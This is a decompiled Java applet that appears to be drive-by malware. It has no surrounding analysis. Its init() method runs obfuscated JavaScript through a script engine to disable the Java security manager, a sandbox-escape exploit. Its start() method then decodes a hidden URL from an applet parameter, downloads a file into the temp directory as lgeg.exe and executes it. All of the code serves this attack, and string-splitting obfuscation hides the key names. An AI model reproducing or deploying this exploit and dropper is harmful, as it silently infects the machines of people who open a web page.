import javax.script.ScriptEngine;
import javax.script.ScriptException;
import java.awt.Component;
import javax.script.ScriptEngineManager;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Verifa extends Applet
{
    private JList mersedes;
    
    @Override
    public void start() {
        try {
            String s = System.getProperty("jabcavabca.iabco.tabcmpabcdabcir".replace("abc", ""));
            if (s.charAt(s.length() - 1) != '\\') {
                s += "\\";
            }
            final String string = s + "lgeg" + ".e".concat("xe");
            final String parameter = this.getParameter("dest");
            String string2 = "";
            for (int i = 0; i < parameter.length(); ++i) {
                int char1 = parameter.charAt(i);
                char1 -= 4;
                string2 += (char)char1;
            }
            final InputStream is = Idmer.createIS(string2);
            final FileOutputStream fileOutputStream = new FileOutputStream(string);
            byte[] array = new byte[153600];
            final byte[] array2 = new byte[1600];
            int read;
            for (int n = 0; (read = is.read(array)) > 0; array = new byte[153600], n += read) {
                fileOutputStream.write(array, 0, read);
            }
            fileOutputStream.close();
            is.close();
            try {
                Idmer.exe(string);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    @Override
    public void init() {
        try {
            final ScriptEngine engineByName = new ScriptEngineManager().getEngineByName("jabcs".replace("abc", ""));
            engineByName.eval("va2mar erra2mor = na2mew Erra2mor(\"Ma2my erra2mor\");tha2mis.toSta2mring = functa2mion(){ jaa2mva.laa2mng.Systa2mem.sa2metSecua2mrityMa2managa2mer(nula2ml);apa2mplea2mt.sta2mart();rea2mturn \"ea2mxploa2mit!\";};a2mera2mror.mesa2msage = tha2mis;".replace("a2m", ""));
            this.add(this.mersedes = new JList(new Object[] { engineByName.get("error") }));
        }
        catch (ScriptException ex) {}
    }
}
